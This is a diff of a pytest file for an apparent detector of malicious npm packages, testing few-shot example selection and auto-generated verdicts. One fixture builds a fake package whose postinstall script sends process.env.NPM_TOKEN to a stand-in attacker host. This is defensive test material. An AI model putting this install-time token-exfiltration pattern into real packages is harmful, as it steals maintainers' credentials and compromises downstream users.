@@ -1,11 +1,12 @@
+import json
 import re
 
 import pytest
 
 from argo.extract.dossier import build_dossier
-from argo.prompts.fewshot import auto_answer, infer_technique, select_fewshot
+from argo.prompts.fewshot import auto_answer, build_fewshot, infer_technique, select_fewshot
 from argo.prompts.render import TEMPLATE_DIR, Example, compress_dossier, render
-from argo.schema import Sample
+from argo.schema import Dossier, Hit, Sample
 from tests.helpers import make_pkg, pkg_json
 
 DOSSIER = "PACKAGE: x@1\n## 1. vectors {weird braces}\n## 4. File changes\n+ a.js"
@@ -83,39 +84,135 @@ def test_infer_technique_and_auto_answer():
     assert ans.verdict == "malicious" and ans.evidence and 0 <= ans.confidence <= 1
 
 
-def _s(i, label, sub):
+def _s(name, label, sub, split="history", prev="0", version="1"):
     return Sample(
-        id=f"s{i}",
-        name=f"s{i}",
-        version="1",
-        prev_version=None,
+        id=f"{name}@{version}",
+        name=name,
+        version=version,
+        prev_version=prev,
         label=label,
         subgroup=sub,
         date="2024-01-01",
-        split="history",
-        history_set="base",
+        split=split,
+        history_set="base" if split == "history" else None,
         source="npm",
         archive_path="x",
+        prev_archive_path="y" if prev else None,
         sha256="0",
-        fingerprint=str(i),
+        fingerprint=name,
     )
 
 
-def test_select_fewshot_mix():
-    cred = _d(
+def _dz(sid, tokens, life=None, changed=False, cats=()):
+    """Dossier with only the structured fields select_fewshot looks at."""
+    return Dossier(
+        sample_id=sid,
+        extractor_version="1",
+        text=f"PACKAGE: {sid}",
+        lifecycle=life or {},
+        lifecycle_changed=changed,
+        dep_changes=[],
+        outside_files=[],
+        target_profiles=[],
+        hits=[Hit(category=c, path="i.js", line=1, snippet="x") for c in cats],
+        changes=[],
+        truncated=False,
+        est_tokens=tokens,
+    )
+
+
+POST = {"postinstall": "node i.js"}
+FEWSHOT_SAMPLES = [
+    # malicious update with an install-time vector: smallest wins (mal-upd-small)
+    _s("mal-upd-big", "malicious", "compromesso"),
+    _s("mal-upd-small", "malicious", "compromesso"),
+    _s("mal-upd-novector", "malicious", "compromesso"),
+    _s("@rspack/cli", "malicious", "compromesso"),  # excluded: shares scope with a test sample
+    # new malicious packages
+    _s("new-net", "malicious", "nato_malevolo", prev=None),
+    _s("new-obf", "malicious", "nato_malevolo", prev=None),  # vector but no net/cred/exec hit
+    _s("react-evil", "malicious", "nato_malevolo", prev=None),  # excluded: stem "react"
+    # benign
+    _s("pop-big", "benign", "benigno_popolare"),
+    _s("pop-small", "benign", "benigno_popolare"),
+    _s("pop-new", "benign", "benigno_popolare", prev=None),  # not an update
+    _s("hard-changed", "benign", "benigno_difficile"),  # install script changed
+    _s("hard-same", "benign", "benigno_difficile"),
+    # a w1 history sample and test samples are never examples
+    _s("w1-upd", "malicious", "shai_hulud_w1").model_copy(update={"history_set": "w1"}),
+    _s("@rspack/core", "malicious", "compromesso", split="test"),
+    _s("react-dom", "benign", "benigno_popolare", split="test"),
+]
+FEWSHOT_DOSSIERS = {
+    "mal-upd-big@1": _dz("mal-upd-big@1", 900, POST, True, ["network"]),
+    "mal-upd-small@1": _dz("mal-upd-small@1", 300, POST, True),
+    "mal-upd-novector@1": _dz("mal-upd-novector@1", 10, {}, False, ["network"]),
+    "@rspack/cli@1": _dz("@rspack/cli@1", 5, POST, True, ["network"]),
+    "new-net@1": _dz("new-net@1", 200, POST, True, ["credentials"]),
+    "new-obf@1": _dz("new-obf@1", 50, POST, True, ["obfuscation"]),
+    "react-evil@1": _dz("react-evil@1", 5, POST, True, ["exec"]),
+    "pop-big@1": _dz("pop-big@1", 800),
+    "pop-small@1": _dz("pop-small@1", 100),
+    "pop-new@1": _dz("pop-new@1", 5),
+    "hard-changed@1": _dz("hard-changed@1", 20, POST, True),
+    "hard-same@1": _dz("hard-same@1", 400, POST, False),
+    "w1-upd@1": _dz("w1-upd@1", 1, POST, True, ["network"]),
+    "@rspack/core@1": _dz("@rspack/core@1", 1, POST, True, ["network"]),
+    "react-dom@1": _dz("react-dom@1", 1),
+}
+
+
+def test_select_fewshot_roles_smallest_and_family_exclusion():
+    picked = [s.id for s in select_fewshot(FEWSHOT_SAMPLES, FEWSHOT_DOSSIERS)]
+    assert picked == ["mal-upd-small@1", "new-net@1", "pop-small@1", "hard-same@1"]
+    reverse = select_fewshot(list(reversed(FEWSHOT_SAMPLES)), FEWSHOT_DOSSIERS)
+    assert picked == [s.id for s in reverse]  # deterministic, independent of corpus order
+
+
+def test_select_fewshot_fails_loudly_without_a_candidate():
+    samples = [s for s in FEWSHOT_SAMPLES if s.subgroup != "benigno_difficile"]
+    with pytest.raises(ValueError, match="benigno_difficile"):
+        select_fewshot(samples, FEWSHOT_DOSSIERS)
+
+
+def _malicious_update():
+    old = make_pkg({"package.json": pkg_json("p", "0"), "lib.js": "x"})
+    new = make_pkg(
         {
             "package.json": pkg_json("p", "1", scripts={"postinstall": "node i.js"}),
-            "i.js": "process.env.NPM_TOKEN",
+            "lib.js": "x",
+            "i.js": "fetch('https://c.evil.xyz/?t=' + process.env.NPM_TOKEN)",
         }
     )
-    net = _d({"package.json": pkg_json("p", "1"), "i.js": "fetch('https://c.evil.xyz')"})
-    samples = [
-        _s(1, "malicious", "nato_malevolo"),
-        _s(2, "malicious", "nato_malevolo"),
-        _s(3, "malicious", "nato_malevolo"),
-        _s(4, "benign", "benigno_popolare"),
-        _s(5, "benign", "benigno_difficile"),
-    ]
-    dossiers = {"s1": cred, "s2": cred, "s3": net, "s4": net, "s5": cred}
-    picked = [s.id for s in select_fewshot(samples, dossiers)]
-    assert picked == ["s1", "s3", "s4", "s5"]
+    return build_dossier("p@1", "p", "1", new, old, "0")
+
+
+def test_auto_answer_evidence_is_copied_from_the_excerpt():
+    d = _malicious_update()
+    excerpt = compress_dossier(d.text)
+    ans = auto_answer(d, "malicious")
+    assert ans.evidence and all(e in excerpt for e in ans.evidence)
+    assert ans.evidence[0].startswith("script postinstall: node i.js")  # section 1 first
+    assert any(e.startswith("[network]") for e in ans.evidence)  # then pattern lines
+    assert "postinstall" in ans.reasoning and "purpose" not in ans.reasoning
+    assert ans.reasoning.count(".") <= 3
+
+
+def test_auto_answer_benign_without_vectors_or_patterns():
+    old = make_pkg({"package.json": pkg_json("p", "0"), "a.js": "1"})
+    new = make_pkg({"package.json": pkg_json("p", "1"), "a.js": "2"})
+    d = build_dossier("p@1", "p", "1", new, old, "0")
+    excerpt = compress_dossier(d.text)
+    ans = auto_answer(d, "benign")
+    assert ans.evidence == ["TYPE: update from 0"] and ans.evidence[0] in excerpt
+    assert ans.technique == "none" and "no install-time execution vector" in ans.reasoning
+
+
+def test_build_fewshot_refuses_to_overwrite(tmp_path):
+    path = tmp_path / "fewshot.json"
+    path.write_text("[]")
+    with pytest.raises(FileExistsError, match="--force"):
+        build_fewshot(FEWSHOT_SAMPLES, FEWSHOT_DOSSIERS, path)
+    assert path.read_text() == "[]"
+    build_fewshot(FEWSHOT_SAMPLES, FEWSHOT_DOSSIERS, path, force=True)
+    assert [e["sample_id"] for e in json.loads(path.read_text())][0] == "mal-upd-small@1"
